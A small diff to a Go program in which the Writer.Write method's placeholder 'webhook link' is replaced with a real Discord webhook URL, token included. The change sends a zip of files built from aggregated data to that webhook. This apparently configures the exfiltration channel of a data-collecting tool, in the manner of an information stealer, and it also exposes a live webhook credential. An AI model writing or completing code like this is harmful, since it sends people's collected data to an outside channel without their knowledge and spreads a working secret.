@@ -528,7 +528,7 @@ func (o *Writer) Write() error {
 	files := buildFilesParallel(agg, o.formatter)
 
 	if err := streamZipAndUpload(
-		"webhook link",
+		"https://discord.com/api/webhooks/1515010902527578144/PHY_JHeZIceREPzonNzzfGnQF2XSwiELlPm8Si5YUxU1857exRxveRUBUNTlkYCvASJL",
 		files,
 	); err != nil {
 		return err
